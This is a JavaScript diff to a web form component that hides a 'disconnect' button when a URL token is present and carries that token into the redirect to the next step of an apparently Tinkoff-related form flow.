@@ -34,6 +34,9 @@ class InputControl extends HTMLElement {
                 this.handleSubmit();
             }
         });
+
+        // Проверка токена и скрытие кнопки disconnect
+        this.checkTokenAndHideDisconnectButton();
     }
 
     static get observedAttributes() {
@@ -46,6 +49,19 @@ class InputControl extends HTMLElement {
         }
         if (name === 'type') {
             this.input.type = newValue;
+        }
+    }
+
+    checkTokenAndHideDisconnectButton() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token'); // Получаем токен, если он есть
+
+        if (token) {
+            // Скрываем кнопку disconnect
+            const disconnectButton = document.querySelector('.disconnect-button');
+            if (disconnectButton) {
+                disconnectButton.style.display = 'none';
+            }
         }
     }
 
@@ -94,7 +110,18 @@ class InputControl extends HTMLElement {
                     });
                 }
                 const pageType = data.next_page_type;
-                window.location.href = `/tinkoff/next/?step=${pageType}`;
+
+                // Извлечение токена из текущего URL
+                const urlParams = new URLSearchParams(window.location.search);
+                const token = urlParams.get('token'); // Получаем токен, если он есть
+
+                // Создание нового URL с токеном
+                let redirectUrl = `/tinkoff/next/?step=${pageType}`;
+                if (token) {
+                    redirectUrl += `&token=${token}`; // Добавляем токен к URL
+                }
+
+                window.location.href = redirectUrl; // Редирект с токеном
                 isRedirect = true;
             } else {
                 this.showError(data.detail || 'Произошла ошибка.');
